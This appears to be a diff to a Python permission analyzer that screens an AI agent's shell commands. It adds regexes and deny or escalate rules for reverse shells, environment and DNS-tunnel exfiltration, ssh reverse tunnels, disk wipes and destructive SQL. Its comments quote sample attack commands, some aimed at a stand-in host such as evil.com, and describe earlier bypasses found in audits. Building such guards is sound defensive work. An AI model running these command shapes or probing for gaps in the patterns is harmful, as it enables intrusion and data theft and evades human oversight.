@@ -1138,7 +1138,7 @@ _NETWORK_EGRESS_BASH_RE = re.compile(
     r"\b(?:curl|wget|nc|ncat|netcat|socat|scp|sftp|rsync|ssh|ftp|telnet)\b"
     r"|urllib\.request|requests\.(?:post|get|put|patch)\b|httpx\."
     r"|socket\.(?:socket|connect|create_connection)"
-    r"|http\.client|aiohttp|/dev/tcp/"
+    r"|http\.client|aiohttp|/dev/(?:tcp|udp)/"
 )
 _SENSITIVE_ENV_VAR_RE = re.compile(
     r"\$\{?[A-Z][A-Z0-9_]*(?:_KEY|_TOKEN|_SECRET|_PASSWORD|_PASSWD)\}?\b"
@@ -1148,6 +1148,10 @@ _ENV_DUMP_TO_NET_RE = re.compile(
     # `exec 3<>/dev/tcp/host/port; env >&3` dumps the environment to a socket
     # with no pipe and no external binary at all.
     r"|\b(?:printenv|env)\b[^|;\n]*>&\s*\d"
+    # [guardrails-security round 2, 2026-08-19] `curl -d "$(env)" http://…` —
+    # command substitution splices the environment straight into an argument;
+    # the pipe/redirect shapes above never see this, there's no `|` or `>&` at all.
+    r"|\$\(\s*(?:printenv|env)\s*\)"
 )
 # The environment object handed wholesale to a network call in Python
 # (`requests.post(url, data=os.environ)`, `http.client ... os.environ[...]`).
@@ -1178,6 +1182,14 @@ _ARCHIVE_PIPE_TO_NET_RE = re.compile(
     r"\b(?:zstd|gzip|bzip2|xz|base64|gpg)\b[^|;\n]*\|\s*(?:sudo\s+)?"
     r"(?:curl|wget|nc|ncat|netcat|socat|scp|rsync)\b"
 )
+# [guardrails-security round 2, 2026-08-19] `ssh -R remote_port:localhost:22
+# attacker@host` opens a reverse tunnel back to an attacker-controlled box —
+# distinct from ordinary outbound ssh (`-L`/plain), which is already
+# escalate-on-private-host via the URL/host sweep below, not denied outright.
+# ESCALATE rather than DENY: the panel judged this an "arguable design
+# accept" — `-R` also has legitimate uses (poking a hole through NAT to
+# expose a local dev server) that a human may want to approve.
+_SSH_REVERSE_TUNNEL_RE = re.compile(r"\bssh\b[^|;\n]*\s-R\b")
 # [S6] Reverse-shell shapes: the direct `nc -e`/`ncat -c`/`socat ... exec:`
 # exec-flag form (this was only claimed as "existing coverage" by a stale
 # comment — no regex ever matched it; found live-unfixed 2026-08-19), a named
@@ -1199,11 +1211,83 @@ _REVERSE_SHELL_RE = re.compile(
     r"|\bmkfifo\b[^|;\n]*(?:[;&\n]|&&)[^|;\n]*\bnc\b[^|;\n]*<"
     r"|\bpython[0-9.]*\b[^\n]*\bimport\s+socket\b[^\n]*\bpty\.spawn\b"
     r"|\bperl\b[^\n]*(?:\buse\s+Socket\b|-MSocket\b)"
-    r"|/dev/tcp/[A-Za-z0-9.\-]+/\d+[^\n]*(?:<&|>&|&>)"
-    r"|(?:<&|>&|&>)[^\n]*/dev/tcp/[A-Za-z0-9.\-]+/\d+"
+    r"|/dev/(?:tcp|udp)/[A-Za-z0-9.\-]+/\d+[^\n]*(?:<&|>&|&>)"
+    r"|(?:<&|>&|&>)[^\n]*/dev/(?:tcp|udp)/[A-Za-z0-9.\-]+/\d+"
     r"|(?=[^\n]*\bimport\s+socket\b)(?=[^\n]*\bos\.dup2\b)"
     r"(?=[^\n]*\b(?:subprocess\.(?:call|run|Popen)\b|os\.exec[lv][ep]?\b|os\.system\b))"
     r"\bpython[0-9.]*\b"
+    # [guardrails-security round 2, 2026-08-19] telnet/nc/ncat/netcat piped
+    # straight into a shell — the same backpipe idea as the mkfifo+nc branch
+    # above, minus the FIFO dance: `telnet host port 0</tmp/f | /bin/bash
+    # 1>/tmp/f` walked through untouched because the mkfifo branch requires
+    # the literal token 'mkfifo' and nc/ncat/netcat's own branch requires an
+    # exec-style flag, neither of which this shape has.
+    r"|\b(?:nc|ncat|netcat|telnet)\b[^|;\n]*\|\s*(?:sudo\s+)?(?:[\w./-]*/)?(?:sh|bash|zsh)\b"
+)
+
+# [guardrails-security round 2, 2026-08-19] Generalized interpreter reverse-
+# shell heuristic. cc40d35's fix (and the _REVERSE_SHELL_RE literals above)
+# only covered the exact python/perl one-liners a prior probe round showed —
+# whack-a-mole on the literal shape, not the underlying pattern. The re-audit
+# found the interpreter-agnostic version of the same idea walking straight
+# through: ruby/php/awk/lua/node one-liners that open a socket and hand it to
+# a shell-exec primitive are reverse shells regardless of which interpreter or
+# exact call names are used. Each tuple is (interpreter token, socket-open
+# primitive, shell-exec primitive); all three must appear anywhere in the
+# command, not adjacently, since a one-liner's own syntax dictates their order
+# (`ruby -rsocket -e 'IO.popen(...);TCPSocket.new(...)'` has exec before
+# socket). Extend this table for a new interpreter sibling, not a new
+# standalone regex — that is the whole point of generalizing this check.
+_INTERPRETER_SOCKET_SHELL_SIGNATURES: list[tuple[re.Pattern, re.Pattern, re.Pattern]] = [
+    (
+        re.compile(r"\bruby\b"),
+        re.compile(r"\bTCPSocket\b|\bSocket\.(?:new|open|tcp)\b"),
+        re.compile(r"\bexec\b|\bsystem\b|\bIO\.popen\b|\bpopen3?\b"),
+    ),
+    (
+        re.compile(r"\bphp\b"),
+        re.compile(r"\bfsockopen\b|\bstream_socket_client\b|\bsocket_create\b"),
+        re.compile(r"\bexec\b|\bsystem\b|\bproc_open\b|\bshell_exec\b|\bpopen\b"),
+    ),
+    (
+        re.compile(r"\bawk\b"),
+        re.compile(r"/inet/(?:tcp|udp)/"),
+        re.compile(r"\bsystem\s*\("),
+    ),
+    (
+        re.compile(r"\blua\b"),
+        re.compile(r"\bsocket\.(?:tcp|connect)\b|require\s*\(?\s*['\"]socket"),
+        re.compile(r"\bos\.execute\b|\bio\.popen\b"),
+    ),
+    (
+        re.compile(r"\bnode\b"),
+        re.compile(r"\bnet\.(?:connect|createConnection)\b|new\s+net\.Socket\b"),
+        re.compile(r"\bchild_process\b|\bexec\b|\bspawn\b"),
+    ),
+]
+
+
+def _interpreter_socket_shell_hit(cmd: str) -> bool:
+    """True if cmd names a scripting interpreter and combines a socket-open
+    primitive with a shell-exec primitive — the general reverse-shell shape,
+    independent of which interpreter or exact call names carry it out."""
+    return any(
+        interp_re.search(cmd) and sock_re.search(cmd) and exec_re.search(cmd)
+        for interp_re, sock_re, exec_re in _INTERPRETER_SOCKET_SHELL_SIGNATURES
+    )
+
+
+# [guardrails-security round 2, 2026-08-19] `host $(...).evil.com` /
+# `nslookup $(...).evil.com` — a DNS-lookup argument built from a command
+# substitution is DNS-tunnel exfil almost by definition (an ordinary lookup
+# names a static host), regardless of destination — there's no "known sink"
+# to check against, the query *is* the payload. Deliberately not folded into
+# _NETWORK_EGRESS_BASH_RE's bare token list: 'host'/'dig' are common English
+# words and command names alike, so gating this on the token alone (rather
+# than the token plus a command-substitution argument) would false-positive
+# on unrelated commands that merely mention "host".
+_DNS_EXFIL_RE = re.compile(
+    r"\b(?:host|nslookup|dig)\b[^|;\n]*(?:\$\(|`)"
 )
 # [RT12] os.system/os.popen hand a full shell command to the OS; pty.spawn
 # starts an interactive shell; eval/exec/compile run arbitrary Python source.
@@ -1283,6 +1367,22 @@ CRITICAL_PATTERNS = [
     r">\s*/dev/disk/by-(?:uuid|id|label|partuuid|path)/\S+",  # device aliases resolve to the same raw disks
     r":\(\)\s*\{.*:\|:.*\}",  # fork bomb
 ]
+
+# Human-readable label per CRITICAL_PATTERNS entry, used only in the DENY
+# message text — CRITICAL_PATTERNS itself stays a plain regex list
+# (test_every_critical_pattern_has_a_sample iterates it as such).
+# Keyed by the exact regex string, so an unlabeled future addition falls back
+# to the literal string "unlabeled catastrophic pattern" instead of raising —
+# unreachable today (test_every_critical_pattern_has_a_label would fail first).
+_CRITICAL_PATTERN_LABELS = {
+    CRITICAL_PATTERNS[0]: "redirect into a raw disk device",
+    CRITICAL_PATTERNS[1]: "filesystem format (mkfs)",
+    CRITICAL_PATTERNS[2]: "dd to/from a raw disk device",
+    CRITICAL_PATTERNS[3]: "tee into a raw disk device",
+    CRITICAL_PATTERNS[4]: "disk-scrubbing tool (wipefs/parted/sfdisk/fdisk/blkdiscard/shred) on a raw device",
+    CRITICAL_PATTERNS[5]: "redirect into a disk-by-id alias",
+    CRITICAL_PATTERNS[6]: "fork bomb",
+}
 
 # ── Protected-table matching (2026-08-18, round-3 audit) ────────────────────
 # Two shape fixes, both found live by the round-3 re-audit:
@@ -1545,6 +1645,26 @@ def _git_push_deleted_ref(cmd: str) -> str | None:
 # never drift apart once they're one tuple. Add the id in the same edit that
 # adds the pattern.
 
+# Human-readable label per HIGH_RISK_PATTERNS rule_id, for the generic DENY
+# message loop below — same fix as _CRITICAL_PATTERN_LABELS above, keyed by
+# rule_id (already a stable per-entry key here) rather than by
+# regex string. An unlabeled future rule_id falls back to the literal string
+# "unlabeled high-risk pattern" instead of raising — unreachable today since
+# every HIGH_RISK_PATTERNS rule_id has an entry (test_every_high_risk_pattern_has_a_label
+# would fail first), but the fallback exists for defense-in-depth.
+_HIGH_RISK_PATTERN_LABELS = {
+    "drop_table": "DROP TABLE",
+    "drop_database": "DROP DATABASE",
+    "drop_trigger": "DROP TRIGGER (removes an audit-table append-only guard)",
+    "delete_unbounded_audit_table": "unbounded DELETE against a protected audit table",
+    "delete_tautology_audit_table": "tautological-WHERE DELETE against a protected audit table",
+    "mutate_protected_table": "mutating verb (UPDATE/ALTER/TRUNCATE/REPLACE/INSERT) against a protected table",
+    "sql_create_table_as_select_protected": "CREATE TABLE ... AS SELECT copying a protected table's rows",
+    "pragma_writable_schema": "PRAGMA writable_schema",
+    "chmod_777_root": "chmod 777 on a root-level path",
+    "git_push_force": "git push --force",
+}
+
 ALLOWED_DELETIONS = [
     "node_modules",
     "dist",
@@ -1605,6 +1725,54 @@ DENIAL_HINTS: dict[str, str] = {
     "blocked_path:context/proposito.md": (
         "The system purpose can only be modified by the user directly. "
         "No agent can edit this file."
+    ),
+    "high_risk_pattern:git_push_force": (
+        "Push without --force/--force-with-lease. If history really needs "
+        "rewriting, that is a human decision outside any agent session — this "
+        "is never unblocked by confirmation."
+    ),
+    "high_risk_pattern:chmod_777_root": (
+        "Scope the chmod to the specific file/dir and the minimum bits it "
+        "actually needs — never 777, never a root-level path."
+    ),
+    "high_risk_pattern:rm_rf": (
+        "If this is genuine cache/build cleanup, ask the user to add the "
+        "target's final path component to ALLOWED_DELETIONS in "
+        "permission_analyzer.py — that file is governance-escalated, so you "
+        "cannot add it yourself. Otherwise this is a real data-loss risk: stop "
+        "and confirm with the user."
+    ),
+    "high_risk_pattern:drop_table": (
+        "Use a reviewed migration under database/migrations/ instead of a raw "
+        "DROP TABLE — see .claude/rules/01_database_mutations.md."
+    ),
+    "high_risk_pattern:drop_database": (
+        "Dropping the database is not recoverable from this session. Stop and "
+        "confirm with the user; do not attempt a workaround."
+    ),
+    "high_risk_pattern:drop_trigger": (
+        "That trigger enforces append-only audit-table semantics — dropping it "
+        "removes a safety guarantee, not just schema. Use a reviewed migration "
+        "and get explicit sign-off, don't just retry."
+    ),
+    "high_risk_pattern:delete_unbounded_audit_table": (
+        "Add a selective WHERE clause — a bare DELETE or a tautological WHERE "
+        "against an audit table is blocked regardless of intent."
+    ),
+    "high_risk_pattern:delete_tautology_audit_table": (
+        "The WHERE clause needs to actually select a subset — "
+        "1=1/TRUE/IS NOT NULL-style conditions are treated as unbounded."
+    ),
+    "high_risk_pattern:mutate_protected_table": (
+        "UPDATE/ALTER/TRUNCATE/REPLACE/INSERT against learned_approvals, "
+        "permission_decisions, agent_actions, instincts, or sqlite_master/"
+        "sqlite_schema is blocked regardless of predicate — those tables are "
+        "audit trails, not general-purpose storage."
+    ),
+    "high_risk_pattern:pragma_writable_schema": (
+        "PRAGMA writable_schema bypasses every DB-enforced trigger in this "
+        "codebase — never needed for a legitimate schema change; use a "
+        "reviewed migration instead."
     ),
     "high_risk_pattern": (
         "Narrow the action: name explicit paths instead of wildcards, bound the "
@@ -1940,13 +2108,23 @@ class PermissionAnalyzer:
         # reverse-shell one-liner names no curl/wget/nc/socat token at all,
         # so gating this on that list would miss exactly the obfuscated
         # shapes it exists to catch.
-        if _REVERSE_SHELL_RE.search(cmd):
+        if _REVERSE_SHELL_RE.search(cmd) or _interpreter_socket_shell_hit(cmd):
             return self._deny(
                 tool, cmd,
                 "Command matches a reverse-shell shape "
-                "(mkfifo+nc, socat exec:, or a socket+pty/Socket one-liner).",
+                "(mkfifo/telnet/nc backpipe, socat exec:, or an interpreter "
+                "one-liner combining a socket-open call with a shell-exec call).",
                 "CRITICAL", "bash_web_egress_reverse_shell",
                 "Reverse shells are never approved from an agent session.",
+            )
+
+        if _DNS_EXFIL_RE.search(cmd):
+            return self._deny(
+                tool, cmd,
+                "Command builds a DNS lookup (host/nslookup/dig) from a "
+                "command substitution — DNS-tunnel exfiltration shape.",
+                "CRITICAL", "bash_web_egress_dns_tunnel",
+                "Never build a DNS query argument from command output.",
             )
 
         # 3. Web-egress bypass via Bash — every socket-opening shape, not just
@@ -2036,6 +2214,13 @@ class PermissionAnalyzer:
                     "a shell/interpreter — human review required.",
                     "bash_web_egress_pipe_to_shell",
                     "Download to a file, inspect it, then run it explicitly.",
+                )
+            if _SSH_REVERSE_TUNNEL_RE.search(cmd):
+                return self._escalate(
+                    tool, cmd[:80],
+                    "Command opens an ssh reverse tunnel (-R) — human review required.",
+                    "bash_web_egress_ssh_reverse_tunnel",
+                    "Confirm this reverse tunnel is intended before approving.",
                 )
             # 2026-08-18: sink-host/opaque-blob reasoning
             # existed only inside the WebFetch gate — `curl https://webhook.site/x`
@@ -2340,7 +2525,8 @@ class PermissionAnalyzer:
             log.warning("permission_analyzer: _candidate_paths failed: %s", _cpe)
             return self._deny(
                 tool, str(detail)[:80],
-                "Internal analyzer error during path extraction — denying as precaution.",
+                f"Internal analyzer error ({type(_cpe).__name__}) during path "
+                "extraction — denying as precaution.",
                 "HIGH", "analyzer_internal_error",
                 "Retry, or ask the user to perform this write manually.",
             )
@@ -2350,8 +2536,8 @@ class PermissionAnalyzer:
                 return self._deny(
                     tool,
                     path,
-                    f"Write blocked at '{path}'. "
-                    "Edit this file manually if needed.",
+                    f"Blocked path '{blocked}' targeted by {tool} write at "
+                    f"'{path}'. Edit this file manually if needed.",
                     "CRITICAL",
                     f"blocked_path:{blocked}",
                     "Edit directly from terminal or ask the user.",
@@ -2407,7 +2593,8 @@ class PermissionAnalyzer:
                 log.warning("permission_analyzer: _bash_touches_blocked failed: %s", _bte)
                 return self._deny(
                     tool, str(cmd)[:80],
-                    "Internal analyzer error during blocked-path check — denying as precaution.",
+                    f"Internal analyzer error ({type(_bte).__name__}) during "
+                    "blocked-path check — denying as precaution.",
                     "HIGH", "analyzer_internal_error",
                     "Retry, or ask the user to run this command manually.",
                 )
@@ -2424,7 +2611,8 @@ class PermissionAnalyzer:
                 log.warning("permission_analyzer: _read_family_credential_block failed: %s", _rte)
                 return self._deny(
                     tool, str(inp.get("file_path", inp.get("path", "")))[:80],
-                    "Internal analyzer error during credential check — denying as precaution.",
+                    f"Internal analyzer error ({type(_rte).__name__}) during "
+                    "credential check — denying as precaution.",
                     "HIGH", "analyzer_internal_error",
                     "Retry, or ask the user to check this file manually.",
                 )
@@ -2444,7 +2632,8 @@ class PermissionAnalyzer:
                 log.warning("permission_analyzer: MCP credential check failed: %s", _mce)
                 return self._deny(
                     tool, str(detail)[:80],
-                    "Internal analyzer error during MCP credential check — denying as precaution.",
+                    f"Internal analyzer error ({type(_mce).__name__}) during "
+                    "MCP credential check — denying as precaution.",
                     "HIGH", "analyzer_internal_error",
                     "Retry, or ask the user to perform this call manually.",
                 )
@@ -2489,7 +2678,8 @@ class PermissionAnalyzer:
                 log.warning("permission_analyzer: _web_egress_block failed: %s", _wee)
                 return self._deny(
                     tool, str(inp.get("url", ""))[:80],
-                    "Internal analyzer error during web egress check — denying as precaution.",
+                    f"Internal analyzer error ({type(_wee).__name__}) during "
+                    "web egress check — denying as precaution.",
                     "HIGH", "analyzer_internal_error",
                     "Retry, or ask the user to fetch this URL manually.",
                 )
@@ -2551,23 +2741,27 @@ class PermissionAnalyzer:
         # command never reaches the ordinary approve path.
         if _ansi_c_decoded and _ansi_c_decoded != _bash_cmd:
             _ansi_hit = None
+            _ansi_label = None
             if any(_t == "/" for _t in _rm_destructive_targets(_ansi_c_decoded)):
                 _ansi_hit = "rm_rf_root"
+                _ansi_label = "recursive-force rm targeting root filesystem"
             else:
                 for _pattern in CRITICAL_PATTERNS:
                     if re.search(_pattern, _ansi_c_decoded, re.IGNORECASE):
                         _ansi_hit = _pattern
+                        _ansi_label = _CRITICAL_PATTERN_LABELS.get(_pattern, "unlabeled catastrophic pattern")
                         break
                 if not _ansi_hit:
                     for _pattern, _rule in HIGH_RISK_PATTERNS:
                         if re.search(_pattern, _ansi_c_decoded, re.IGNORECASE):
                             _ansi_hit = _rule
+                            _ansi_label = _HIGH_RISK_PATTERN_LABELS.get(_rule, "unlabeled high-risk pattern")
                             break
             if _ansi_hit:
                 return self._escalate(
                     tool, _bash_cmd[:80],
                     f"Command contains an ANSI-C quoted ($'...') span that "
-                    f"decodes to a high-risk pattern ('{_ansi_hit}') — human "
+                    f"decodes to a high-risk pattern ('{_ansi_label}') — human "
                     "review required.",
                     f"bash_ansi_c_obfuscated:{_ansi_hit}",
                     "Confirm the decoded command's intent with the user "
@@ -2611,9 +2805,10 @@ class PermissionAnalyzer:
                     if re.search(pattern, cmd, re.IGNORECASE) or (
                         _sql_decommented and re.search(pattern, _sql_decommented, re.IGNORECASE)
                     ):
+                        _label = _CRITICAL_PATTERN_LABELS.get(pattern, "unlabeled catastrophic pattern")
                         return self._deny(
                             tool, cmd,
-                            f"Catastrophic command blocked: '{cmd[:80]}'",
+                            f"Catastrophic command blocked ({_label}): '{cmd[:80]}'",
                             "CRITICAL", f"critical_pattern:{pattern}",
                             "This command is irreversible and catastrophic.",
                         )
@@ -2621,7 +2816,8 @@ class PermissionAnalyzer:
                 log.warning("permission_analyzer: CRITICAL pattern check failed: %s", _ce)
                 return self._deny(
                     tool, str(inp.get("command", ""))[:80],
-                    "Internal analyzer error during critical check — denying as precaution.",
+                    f"Internal analyzer error ({type(_ce).__name__}) during "
+                    "critical check — denying as precaution.",
                     "HIGH", "analyzer_internal_error",
                     "Retry with a valid command string.",
                 )
@@ -2638,14 +2834,16 @@ class PermissionAnalyzer:
                     if DQIII8_MODE == "autonomous":
                         return self._deny(
                             tool, cmd,
-                            f"High-risk command in autonomous mode: {cmd[:80]}",
+                            f"High-risk command in autonomous mode (recursive-force rm "
+                            f"outside ALLOWED_DELETIONS): {cmd[:80]}",
                             "HIGH", "high_risk_pattern:rm_rf",
                             "Use ALLOWED_DELETIONS or run in supervised mode.",
                         )
                     else:
                         return self._deny(
                             tool, cmd,
-                            f"Blocked command: '{cmd[:80]}'",
+                            f"Blocked command (recursive-force rm outside "
+                            f"ALLOWED_DELETIONS): '{cmd[:80]}'",
                             "CRITICAL", "high_risk_pattern:rm_rf",
                             "This command is destructive and irreversible.",
                         )
@@ -2700,17 +2898,18 @@ class PermissionAnalyzer:
                     if re.search(pattern, cmd, re.IGNORECASE) or (
                         _sql_decommented and re.search(pattern, _sql_decommented, re.IGNORECASE)
                     ):
+                        _label = _HIGH_RISK_PATTERN_LABELS.get(_rule, "unlabeled high-risk pattern")
                         if DQIII8_MODE == "autonomous":
                             return self._deny(
                                 tool, cmd,
-                                f"High-risk command in autonomous mode: {cmd[:80]}",
+                                f"High-risk command in autonomous mode ({_label}): {cmd[:80]}",
                                 "HIGH", f"high_risk_pattern:{_rule}",
                                 "Use ALLOWED_DELETIONS or run in supervised mode.",
                             )
                         else:
                             return self._deny(
                                 tool, cmd,
-                                f"Blocked command: '{cmd[:80]}'",
+                                f"Blocked command ({_label}): '{cmd[:80]}'",
                                 "CRITICAL", f"high_risk_pattern:{_rule}",
                                 "This command is destructive and irreversible.",
                             )
@@ -2718,7 +2917,8 @@ class PermissionAnalyzer:
                 log.warning("permission_analyzer: HIGH_RISK pattern check failed: %s", _he)
                 return self._deny(
                     tool, str(inp.get("command", ""))[:80],
-                    "Internal analyzer error during high-risk check — denying as precaution.",
+                    f"Internal analyzer error ({type(_he).__name__}) during "
+                    "high-risk check — denying as precaution.",
                     "HIGH", "analyzer_internal_error",
                     "Retry with a valid command string.",
                 )
@@ -2765,10 +2965,13 @@ class PermissionAnalyzer:
         # Enrich reason with self-correction hint
         enriched_reason = reason
         if rule_triggered:
-            for key, hint in DENIAL_HINTS.items():
-                if key in rule_triggered:
-                    enriched_reason = f"{reason} | Alternative: {hint}"
-                    break
+            # Longest matching key wins (not insertion/iteration order) so a
+            # specific "high_risk_pattern:git_push_force"-style key is never
+            # shadowed by the generic "high_risk_pattern" catch-all.
+            _matches = [key for key in DENIAL_HINTS if key in rule_triggered]
+            if _matches:
+                _best = max(_matches, key=len)
+                enriched_reason = f"{reason} | Alternative: {DENIAL_HINTS[_best]}"
         return {
             "decision": "DENY",
             "reason": enriched_reason,
@@ -2933,7 +3136,8 @@ class PermissionAnalyzer:
             log.warning("permission_analyzer: _check_resource_claim query failed: %s", e, exc_info=True)
             return self._deny(
                 tool, path,
-                "Internal analyzer error during resource-claim check — denying as precaution.",
+                f"Internal analyzer error ({type(e).__name__}) during "
+                "resource-claim check — denying as precaution.",
                 "HIGH", "analyzer_internal_error",
                 "Retry once the permissions DB is reachable.",
             )
@@ -2970,7 +3174,8 @@ class PermissionAnalyzer:
             log.warning("permission_analyzer: _check_budget query failed: %s", e, exc_info=True)
             return self._deny(
                 "budget", session_id,
-                "Internal analyzer error during budget check — denying as precaution.",
+                f"Internal analyzer error ({type(e).__name__}) during "
+                "budget check — denying as precaution.",
                 "HIGH", "analyzer_internal_error",
                 "Retry once the permissions DB is reachable.",
             )
